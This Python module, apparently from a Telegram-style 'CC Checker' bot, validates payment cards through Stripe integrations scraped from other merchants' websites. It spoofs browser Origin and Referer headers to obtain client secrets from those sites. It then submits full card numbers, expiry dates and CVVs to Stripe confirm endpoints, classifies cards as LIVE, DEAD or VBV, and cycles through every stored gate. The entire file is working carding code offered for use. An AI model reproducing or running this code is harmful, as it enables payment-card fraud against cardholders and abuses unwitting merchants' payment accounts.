"""
gateways/scraped_gate.py — CC Checker using Scraped Stripe Gates

Scanned aur DB mein save kiye gaye gates use karke CC check karta hai.
Flow:
1. DB se available gates lo
2. Gate ka endpoint call karo → client_secret lo
3. Stripe JS style se SetupIntent/PaymentIntent confirm karo card se
4. Result parse karo → LIVE/DEAD/VBV
"""
import asyncio
import aiohttp
import logging
from aiohttp import ClientTimeout
from typing import Optional

from gateways.base import GatewayResult, CCStatus
from gateways.stripe_gate import STRIPE_JS_HEADERS, STRIPE_DECLINE_MAP, _parse_result
from core.parser import CardData
import config

logger = logging.getLogger("CC-Checker.ScrapedGate")
TIMEOUT = ClientTimeout(total=15)

BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "X-Requested-With": "XMLHttpRequest",
}


async def _get_client_secret(
    session: aiohttp.ClientSession,
    gate: dict,
) -> Optional[str]:
    """
    Call the gate's endpoint to get a fresh client_secret.
    Gate dict: {domain, endpoint, method, intent_type, pk_key, payload_template}
    """
    endpoint = gate.get("endpoint", "")
    domain = gate.get("domain", "")
    method = gate.get("method", "POST").upper()
    
    # Build URL
    if endpoint.startswith("http"):
        url = endpoint
    else:
        url = f"https://{domain}{endpoint}"
    
    # Payload
    payload_template = gate.get("payload_template", {})
    if not payload_template:
        # Default payloads based on common patterns
        if "setup" in endpoint.lower():
            payload = {}
        else:
            payload = {"amount": 100, "currency": "usd"}
    else:
        try:
            payload = dict(payload_template)
        except Exception:
            payload = {"amount": 100, "currency": "usd"}
    
    origin = f"https://{domain}"
    req_headers = {
        **BROWSER_HEADERS,
        "Origin": origin,
        "Referer": origin + "/",
    }
    
    try:
        if method == "POST":
            async with session.post(
                url, json=payload, headers=req_headers,
                timeout=TIMEOUT, ssl=False, allow_redirects=False,
            ) as r:
                if r.status in (200, 201):
                    data = await r.json(content_type=None)
                    # Try multiple response keys
                    secret = (
                        data.get("clientSecret") or 
                        data.get("client_secret") or
                        data.get("secret") or
                        data.get("data", {}).get("clientSecret") if isinstance(data.get("data"), dict) else None
                    )
                    if secret and "_secret_" in str(secret):
                        return str(secret)
    except Exception as e:
        logger.debug(f"Gate endpoint error ({url}): {e}")
    
    return None


async def _confirm_with_card(
    session: aiohttp.ClientSession,
    client_secret: str,
    card: CardData,
    pk_key: str,
    intent_type: str,
) -> dict:
    """Confirm a PaymentIntent or SetupIntent with card data."""
    
    if client_secret.startswith("seti_") or intent_type == "setup_intent":
        # SetupIntent confirm
        si_id = client_secret.split("_secret_")[0]
        data = {
            "client_secret": client_secret,
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card.number,
            "payment_method_data[card][exp_month]": card.month,
            "payment_method_data[card][exp_year]": card.year,
            "payment_method_data[card][cvc]": card.cvv,
        }
        confirm_url = f"https://api.stripe.com/v1/setup_intents/{si_id}/confirm"
    else:
        # PaymentIntent confirm
        pi_id = client_secret.split("_secret_")[0]
        data = {
            "client_secret": client_secret,
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card.number,
            "payment_method_data[card][exp_month]": card.month,
            "payment_method_data[card][exp_year]": card.year,
            "payment_method_data[card][cvc]": card.cvv,
            "payment_method_data[billing_details][address][country]": "US",
        }
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
    
    headers = {
        **STRIPE_JS_HEADERS,
        "Authorization": f"Bearer {pk_key}",
    }
    
    async with session.post(
        confirm_url, data=data, headers=headers, timeout=TIMEOUT
    ) as r:
        return await r.json(content_type=None)


async def check_scraped_gate(card: CardData, gate: dict) -> GatewayResult:
    """
    Check a CC using a scraped Stripe gate from the database.
    
    gate = {
        'id': int,
        'domain': str,
        'pk_key': str,
        'endpoint': str,
        'method': str,
        'intent_type': str ('payment_intent' or 'setup_intent'),
        'payload_template': dict,
    }
    """
    pk_key = gate.get("pk_key", "")
    intent_type = gate.get("intent_type", "payment_intent")
    gate_name = "Stripe Gate"

    if not pk_key:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway=gate_name,
            message="No PK key in gate config",
            raw_code="no_pk",
        )
    
    try:
        async with aiohttp.ClientSession() as session:
            # Step 1: Get fresh client_secret from the site
            client_secret = await _get_client_secret(session, gate)

            if not client_secret:
                return GatewayResult(
                    status=CCStatus.ERROR,
                    gateway=gate_name,
                    message="Endpoint unavailable — try /gscan again",
                    raw_code="endpoint_failed",
                )

            # Step 2: Confirm with card
            result_raw = await _confirm_with_card(
                session, client_secret, card, pk_key, intent_type
            )

            # Step 3: Parse result
            result = _parse_result(result_raw)
            result.gateway = gate_name
            return result

    except asyncio.TimeoutError:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway=gate_name,
            message="Request timed out",
            raw_code="timeout",
        )
    except Exception as e:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway=gate_name,
            message=f"Error: {str(e)[:60]}",
            raw_code="exception",
        )


async def check_all_scraped_gates(card: CardData) -> GatewayResult:
    """
    Try all saved scraped gates in sequence until one gives a definitive result.
    """
    import database.db as db
    
    gates = await db.get_active_gates()
    
    if not gates:
        return GatewayResult(
            status=CCStatus.ERROR,
            gateway="ScrapedGates",
            message="No scraped gates available. Use /gscan to add gates.",
            raw_code="no_gates",
        )
    
    last_result = None
    for gate in gates:
        result = await check_scraped_gate(card, gate)
        last_result = result
        
        if result.status != CCStatus.ERROR:
            return result  # Definitive result found
        
        await asyncio.sleep(0.3)
    
    return last_result or GatewayResult(
        status=CCStatus.ERROR,
        gateway="ScrapedGates",
        message="All scraped gates failed",
        raw_code="all_failed",
    )
